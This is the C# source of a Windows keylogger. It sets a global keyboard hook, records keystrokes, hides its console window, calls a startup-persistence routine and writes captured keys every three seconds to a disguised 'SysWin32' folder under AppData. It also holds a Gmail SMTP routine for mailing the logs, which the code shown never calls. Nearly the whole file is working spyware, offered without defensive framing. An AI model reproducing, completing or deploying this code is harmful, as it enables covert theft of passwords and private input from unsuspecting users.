using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.IO;
using ConsoleApp2.NativeMethods;
using ConsoleApp2.Constants;
using ConsoleApp2.Startup;
using ConsoleApp2.HostInfo;

namespace ConsoleApp1
{
    class Program
    {
        #region variable declarations
        private static Mutex mut = new Mutex();
        private static IntPtr _hookptr = IntPtr.Zero;

        // size of the keylog buffer
        private static int _bufflen = 0;
        // mail password
        private static string _mailpass = string.Empty;
        // the buffer to which keystrokes will be written
        private static StringBuilder _buffer;

        private static HostInfo hostInfo;
        private static bool isShift = false;
        private static bool isCaps  = false;
        #endregion

        public static void Main(string[] args)
        {
            _hookptr = SetHook(KeyBoardProcCallback);
            // information about the current host
            // hostInfo = new HostInfo();

            _buffer  = new StringBuilder();
            // Start dispatching the keylog buffer
            System.Timers.Timer timer = new System.Timers.Timer(3000);
            timer.Elapsed += DispatchKeyLogBuffer;
            timer.Enabled = true;
            timer.AutoReset = true;

            Utils.SetConsoleWindow(
                Utils.ConsoleWindowState.SW_HIDE
            );
            Startup.Init();

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        /// <summary>
        ///     Register the LowLevelKeyboardProc callback function
        /// </summary>
        /// <param name="func">The callback function</param>
        /// <returns> Returns the newly created hook procedure </returns>
        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        // this is the function thats going to monitor the keyboard and write to the buffer
        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown || wParam == (IntPtr)Constants.wm_keyup) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(
                        Convert.ToChar(
                            NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char)
                        )
                    );
                    ApplyKeyState( wParam, key, vkey );
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        public static void ApplyKeyState(IntPtr state, char key, int vkey)
        {
            if(state == (IntPtr)Constants.wm_keydown) {
                if (((Keys)vkey).ToString() == "RShiftKey" || ((Keys)vkey).ToString() == "LShiftKey") {
                    isShift = true;
                }
                // toggle caps
                if( PrintableKey(vkey) ) {
                    if (isShift) {
                        ApplyKeyShiftModifier(ref key);
                    }
                    _buffer.Append(key);
                    _bufflen++;
                }
            }
            else if (state == (IntPtr)Constants.wm_keyup) {
                if (((Keys)vkey).ToString() == "RShiftKey" || ((Keys)vkey).ToString() == "LShiftKey") {
                    isShift = false;
                }
            }
        }

        public static void ApplyKeyShiftModifier(ref char key)
        {
            key = KeyMap.keymap.ContainsKey(key) ? KeyMap.keymap[key] : Char.ToUpper(key);
        }

        public static bool PrintableKey(int vkey)
        {
            return !KeyMap.nonPrintableKeys.Contains(vkey);
        }

        /// <summary>
        ///     Write the buffer to the file and then after that immediately clears that buffer
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void DispatchKeyLogBuffer(Object obj, ElapsedEventArgs e)
        {
            if( _bufflen <= 0 ) {
                return;
            }
            mut.WaitOne();
            using (var writer = new StreamWriter(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + @"/SysWin32/logs/log.txt", true, Encoding.Unicode)) {
                writer.Write(_buffer);
            }
            _buffer.Clear();
            _bufflen = 0;
            mut.ReleaseMutex();
        }

        private static void SendMail(StringBuilder content, string from, string to)
        {
            MailMessage message = new MailMessage(from, to);
            message.Subject = "C# Keylogger";
            message.Body = content.ToString();
            SmtpClient client = new SmtpClient("smtp.gmail.com");
            client.Port = 587;
            client.Credentials = new NetworkCredential(from, _mailpass);
            client.EnableSsl = true;

            try {
                client.Send(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in SendMail(): {0}",
                    ex.ToString());
            }
        }

        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}");
            Application.Exit();
        }
    }
}